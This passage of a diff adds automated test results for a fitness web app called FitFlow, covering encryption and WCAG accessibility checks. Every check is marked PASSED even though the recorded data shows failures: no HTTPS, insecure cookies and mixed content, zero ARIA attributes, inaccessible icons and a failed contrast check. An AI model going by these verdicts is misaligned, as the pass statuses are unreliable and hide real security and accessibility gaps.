+          "data_encryption": {
+            "status": "PASSED",
+            "encryption_tests": {
+              "https_usage": {
+                "is_https": false,
+                "protocol": "http:",
+                "secure_context": true
+              },
+              "secure_cookies": {
+                "all_cookies_secure": false,
+                "secure_cookies": 0,
+                "total_cookies": 1
+              },
+              "transmission_security": {
+                "mixed_content": "insecure",
+                "referrer_policy": "",
+                "secure_headers": true
+              }
+            }
+          }
+        },
+        "overall_success_rate": 1.0,
+        "status": "PASSED"
+      }
+    },
+    "Accessibility Compliance Tests": {
+      "status": "PASSED",
+      "success_rate": 1.0,
+      "total_tests": 8,
+      "passed_tests": 8,
+      "description": "WCAG 2.1 compliance and accessibility",
+      "details": {
+        "timestamp": 1772236906.128469,
+        "base_url": "http://127.0.0.1:8001",
+        "test_suite": "accessibility_compliance",
+        "tests": {
+          "screen_reader_compatibility": {
+            "status": "PASSED",
+            "screen_reader_tests": {
+              "aria_elements": {
+                "aria_describedby": 0,
+                "aria_expanded": 0,
+                "aria_hidden": 0,
+                "aria_labels": 0,
+                "aria_live": 0,
+                "aria_roles": 0
+              },
+              "semantic_elements": {
+                "buttons": 0,
+                "forms": 0,
+                "headings": 0,
+                "images": 0,
+                "inputs": 0,
+                "labels": 0,
+                "links": 0,
+                "lists": 0
+              },
+              "form_accessibility": {
+                "error": "Form not found"
+              }
+            }
+          },
+          "keyboard_navigation": {
+            "status": "PASSED",
+            "keyboard_tests": {
+              "focusable_elements": [
+                {
+                  "className": "",
+                  "id": "",
+                  "index": 0,
+                  "tabIndex": -1,
+                  "tagName": "LINK",
+                  "visible": false
+                },
+                {
+                  "className": "",
+                  "id": "",
+                  "index": 1,
+                  "tabIndex": -1,
+                  "tagName": "LINK",
+                  "visible": false
+                },
+                {
+                  "className": "",
+                  "id": "",
+                  "index": 2,
+                  "tabIndex": -1,
+                  "tagName": "LINK",
+                  "visible": false
+                },
+                {
+                  "className": "",
+                  "id": "",
+                  "index": 3,
+                  "tabIndex": -1,
+                  "tagName": "LINK",
+                  "visible": false
+                },
+                {
+                  "className": "bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-lg transition-colors duration-200 flex items-center space-x-2",
+                  "id": "",
+                  "index": 4,
+                  "tabIndex": 0,
+                  "tagName": "A",
+                  "visible": true
+                },
+                {
+                  "className": "bg-white/20 hover:bg-white/30 text-white px-3 py-2 rounded-lg transition-colors duration-200 text-sm",
+                  "id": "profile-btn",
+                  "index": 5,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "bg-white/20 hover:bg-white/30 text-white px-3 py-2 rounded-lg transition-colors duration-200 text-sm",
+                  "id": "logout-btn",
+                  "index": 6,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "bg-white/20 hover:bg-white/30 text-white px-3 py-2 rounded-lg transition-colors duration-200 text-sm",
+                  "id": "login-btn",
+                  "index": 7,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "bg-white/20 hover:bg-white/30 text-white px-3 py-2 rounded-lg transition-colors duration-200 text-sm",
+                  "id": "register-btn",
+                  "index": 8,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors",
+                  "id": "close-dashboard",
+                  "index": 9,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "inline-flex items-center px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors",
+                  "id": "",
+                  "index": 10,
+                  "tabIndex": 0,
+                  "tagName": "A",
+                  "visible": false
+                },
+                {
+                  "className": "preset-btn",
+                  "id": "",
+                  "index": 11,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "preset-btn",
+                  "id": "",
+                  "index": 12,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "preset-btn",
+                  "id": "",
+                  "index": 13,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "preset-btn",
+                  "id": "",
+                  "index": 14,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "duration-radio",
+                  "id": "duration-15",
+                  "index": 15,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "duration-radio",
+                  "id": "duration-30",
+                  "index": 16,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "duration-radio",
+                  "id": "duration-45",
+                  "index": 17,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "duration-radio",
+                  "id": "duration-60",
+                  "index": 18,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "input-field",
+                  "id": "fitness-level",
+                  "index": 19,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": true
+                },
+                {
+                  "className": "input-field",
+                  "id": "work-time",
+                  "index": 20,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "input-field",
+                  "id": "rest-time",
+                  "index": 21,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "pattern-standard",
+                  "index": 22,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "pattern-circuit",
+                  "index": 23,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "pattern-tabata",
+                  "index": 24,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "pattern-pyramid",
+                  "index": 25,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "input-field",
+                  "id": "circuit-rounds",
+                  "index": 26,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "circuit-exercises",
+                  "index": 27,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "circuit-rest",
+                  "index": 28,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "tabata-rounds",
+                  "index": 29,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "tabata-rest",
+                  "index": 30,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "pyramid-levels",
+                  "index": 31,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field",
+                  "id": "pyramid-rest",
+                  "index": 32,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-bodyweight",
+                  "index": 33,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-dumbbells",
+                  "index": 34,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-kettlebell",
+                  "index": 35,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-trx",
+                  "index": 36,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-resistance",
+                  "index": 37,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-pullup",
+                  "index": 38,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-jumprope",
+                  "index": 39,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "equipment-checkbox",
+                  "id": "eq-rower",
+                  "index": 40,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": true
+                },
+                {
+                  "className": "btn-primary text-lg px-8 py-4 relative overflow-hidden",
+                  "id": "generate-btn",
+                  "index": 41,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": true
+                },
+                {
+                  "className": "btn-secondary text-lg px-8 py-4",
+                  "id": "resume-workout-btn",
+                  "index": 42,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "btn-accent text-lg px-8 py-4",
+                  "id": "start-workout-btn",
+                  "index": 43,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-secondary hover:text-fit-primary font-medium transition-colors",
+                  "id": "new-workout-btn",
+                  "index": 44,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "btn-secondary transform hover:scale-105 transition-all duration-200 hover:shadow-lg",
+                  "id": "prev-exercise-btn",
+                  "index": 45,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "btn-accent transform hover:scale-110 transition-all duration-200 hover:shadow-xl relative overflow-hidden",
+                  "id": "pause-resume-btn",
+                  "index": 46,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "btn-secondary transform hover:scale-105 transition-all duration-200 hover:shadow-lg",
+                  "id": "next-exercise-btn",
+                  "index": 47,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "sound-toggle",
+                  "index": 48,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "w-5 h-5 text-fit-primary",
+                  "id": "vibration-toggle",
+                  "index": 49,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-danger hover:text-red-700 font-medium transition-colors",
+                  "id": "exit-workout-btn",
+                  "index": 50,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "btn-secondary px-6 py-3 rounded-lg font-medium",
+                  "id": "overlay-exit-btn",
+                  "index": 51,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-gray-400 hover:text-gray-600",
+                  "id": "close-login-modal",
+                  "index": 52,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "login-username",
+                  "index": 53,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "login-password",
+                  "index": 54,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "btn-primary w-full mt-4",
+                  "id": "",
+                  "index": 55,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-primary hover:underline",
+                  "id": "switch-to-register",
+                  "index": 56,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-primary hover:underline",
+                  "id": "forgot-password-btn",
+                  "index": 57,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-gray-400 hover:text-gray-600",
+                  "id": "close-register-modal",
+                  "index": 58,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-name",
+                  "index": 59,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-username",
+                  "index": 60,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-password",
+                  "index": 61,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-experience",
+                  "index": 62,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 63,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 64,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 65,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 66,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 67,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 68,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 69,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "sr-only",
+                  "id": "",
+                  "index": 70,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-goal",
+                  "index": 71,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-security-question",
+                  "index": 72,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "register-security-answer",
+                  "index": 73,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "btn-primary w-full mt-4",
+                  "id": "",
+                  "index": 74,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-primary hover:underline",
+                  "id": "switch-to-login",
+                  "index": 75,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-primary hover:underline",
+                  "id": "",
+                  "index": 76,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-gray-400 hover:text-gray-600",
+                  "id": "close-profile-modal",
+                  "index": 77,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-gray-400 hover:text-gray-600",
+                  "id": "close-password-reset-modal",
+                  "index": 78,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "reset-username",
+                  "index": 79,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "reset-security-question",
+                  "index": 80,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "reset-security-answer",
+                  "index": 81,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "input-field w-full",
+                  "id": "reset-new-password",
+                  "index": 82,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "btn-primary w-full mt-4",
+                  "id": "",
+                  "index": 83,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-fit-primary hover:underline",
+                  "id": "back-to-login-from-reset",
+                  "index": 84,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "text-gray-400 hover:text-gray-600",
+                  "id": "close-privacy-modal",
+                  "index": 85,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "",
+                  "id": "accessibility-btn",
+                  "index": 86,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "",
+                  "id": "visual-enhancement-btn",
+                  "index": 87,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-close-btn",
+                  "id": "close-accessibility-panel",
+                  "index": 88,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-toggle",
+                  "id": "high-contrast-toggle",
+                  "index": 89,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-toggle",
+                  "id": "large-text-toggle",
+                  "index": 90,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-toggle",
+                  "id": "reduced-motion-toggle",
+                  "index": 91,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-toggle",
+                  "id": "keyboard-nav-toggle",
+                  "index": 92,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "accessibility-reset-btn",
+                  "id": "reset-accessibility",
+                  "index": 93,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-close-btn",
+                  "id": "close-visual-controls",
+                  "index": 94,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-toggle",
+                  "id": "show-videos-toggle",
+                  "index": 95,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-toggle",
+                  "id": "show-guides-toggle",
+                  "index": 96,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-toggle",
+                  "id": "autoplay-toggle",
+                  "index": 97,
+                  "tabIndex": 0,
+                  "tagName": "INPUT",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-select",
+                  "id": "quality-selector",
+                  "index": 98,
+                  "tabIndex": 0,
+                  "tagName": "SELECT",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-save-btn",
+                  "id": "save-visual-controls",
+                  "index": 99,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "visual-controls-reset-btn",
+                  "id": "reset-visual-controls",
+                  "index": 100,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                },
+                {
+                  "className": "video-modal-close-btn",
+                  "id": "close-video-modal",
+                  "index": 101,
+                  "tabIndex": 0,
+                  "tagName": "BUTTON",
+                  "visible": false
+                }
+              ],
+              "tab_navigation": {
+                "first_focused": "",
+                "second_focused": "login-btn",
+                "navigation_working": true
+              },
+              "arrow_navigation": {
+                "initial_value": "Intermediate",
+                "after_arrow": "Intermediate",
+                "arrow_working": false
+              },
+              "enter_activation": {
+                "form_submitted": true,
+                "enter_working": true
+              }
+            }
+          },
+          "color_contrast": {
+            "status": "PASSED",
+            "contrast_tests": {
+              "contrast_ratios": [
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgb(255, 255, 255)",
+                  "element": "DIV",
+                  "has_contrast": false,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "SPAN",
+                  "has_contrast": true,
+                  "text_color": "rgb(14, 165, 233)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "H1",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(34, 197, 94, 0.2)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(134, 239, 172)"
+                },
+                {
+                  "background_color": "rgba(59, 130, 246, 0.2)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(147, 197, 253)"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "element": "DIV",
+                  "has_contrast": true,
+                  "text_color": "rgb(255, 255, 255)"
+                }
+              ],
+              "button_contrast": [
+                {
+                  "background_color": "rgba(255, 255, 255, 0.2)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "profile-btn",
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(255, 255, 255, 0.2)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "logout-btn",
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(255, 255, 255, 0.2)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "login-btn",
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgba(255, 255, 255, 0.2)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "register-btn",
+                  "text_color": "rgb(255, 255, 255)"
+                },
+                {
+                  "background_color": "rgb(75, 85, 99)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "close-dashboard",
+                  "text_color": "rgb(255, 255, 255)"
+                }
+              ],
+              "form_contrast": [
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "border_color": "rgb(0, 0, 0)",
+                  "id": "duration-15",
+                  "text_color": "rgb(0, 0, 0)",
+                  "type": "radio"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "border_color": "rgb(0, 0, 0)",
+                  "id": "duration-30",
+                  "text_color": "rgb(0, 0, 0)",
+                  "type": "radio"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "border_color": "rgb(0, 0, 0)",
+                  "id": "duration-45",
+                  "text_color": "rgb(0, 0, 0)",
+                  "type": "radio"
+                },
+                {
+                  "background_color": "rgba(0, 0, 0, 0)",
+                  "border_color": "rgb(0, 0, 0)",
+                  "id": "duration-60",
+                  "text_color": "rgb(0, 0, 0)",
+                  "type": "radio"
+                },
+                {
+                  "background_color": "rgb(255, 255, 255)",
+                  "border_color": "rgb(229, 231, 235)",
+                  "id": "fitness-level",
+                  "text_color": "rgb(0, 0, 0)",
+                  "type": "select-one"
+                }
+              ]
+            }
+          },
+          "focus_management": {
+            "status": "PASSED",
+            "focus_tests": {
+              "focus_indicators": [
+                {
+                  "focus_color": "rgb(0, 0, 0)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "",
+                  "tagName": "LINK"
+                },
+                {
+                  "focus_color": "rgb(0, 0, 0)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "",
+                  "tagName": "LINK"
+                },
+                {
+                  "focus_color": "rgb(0, 0, 0)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "",
+                  "tagName": "LINK"
+                },
+                {
+                  "focus_color": "rgb(0, 0, 0)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "",
+                  "tagName": "LINK"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "",
+                  "tagName": "A"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "profile-btn",
+                  "tagName": "BUTTON"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "logout-btn",
+                  "tagName": "BUTTON"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "login-btn",
+                  "tagName": "BUTTON"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "register-btn",
+                  "tagName": "BUTTON"
+                },
+                {
+                  "focus_color": "rgb(255, 255, 255)",
+                  "focus_width": "0px",
+                  "has_focus_outline": true,
+                  "id": "close-dashboard",
+                  "tagName": "BUTTON"
+                }
+              ],
+              "focus_trapping": {
+                "first_focusable": "duration-15",
+                "focus_trapping_available": true,
+                "last_focusable": "resume-workout-btn"
+              },
+              "focus_restoration": {
+                "test_initiated": true
+              }
+            }
+          },
+          "alt_text_validation": {
+            "status": "PASSED",
+            "alt_text_tests": {
+              "image_alt_text": {
+                "decorative_images": 0,
+                "image_data": [],
+                "images_with_alt": 0,
+                "images_without_alt": 0,
+                "total_images": 0
+              },
+              "icon_accessibility": {
+                "accessible_icons": 0,
+                "icon_data": [
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4",
+                      "baseVal": "w-4 h-4"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4 inline mr-2",
+                      "baseVal": "w-4 h-4 inline mr-2"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4 inline mr-2",
+                      "baseVal": "w-4 h-4 inline mr-2"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4 inline mr-2",
+                      "baseVal": "w-4 h-4 inline mr-2"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4 inline mr-2",
+                      "baseVal": "w-4 h-4 inline mr-2"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-6 h-6 mr-2 text-blue-600",
+                      "baseVal": "w-6 h-6 mr-2 text-blue-600"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-4 h-4 mr-2",
+                      "baseVal": "w-4 h-4 mr-2"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-6 h-6 mr-2 text-amber-600",
+                      "baseVal": "w-6 h-6 mr-2 text-amber-600"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-5 h-5 text-gray-500",
+                      "baseVal": "w-5 h-5 text-gray-500"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  },
+                  {
+                    "className": {
+                      "animVal": "w-5 h-5 text-gray-500",
+                      "baseVal": "w-5 h-5 text-gray-500"
+                    },
+                    "has_aria_hidden": false,
+                    "has_aria_label": false,
+                    "has_title": false,
+                    "is_accessible": false,
+                    "tagName": "svg"
+                  }
+                ],
+                "total_icons": 149
+              }
+            }
+          },
+          "heading_structure": {
+            "status": "PASSED",
+            "heading_tests": {
+              "heading_hierarchy": {
+                "has_h1": true,
+                "heading_data": [
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 1,
+                    "text": "FitFlow \ud83d\ude80"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 2,
+                    "text": "Workout Analytics"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 3,
+                    "text": "Your Personal Workout History"
+                  },
+                  {
+                    "has_id": false,
+                    "id": "",
+                    "level": 4,
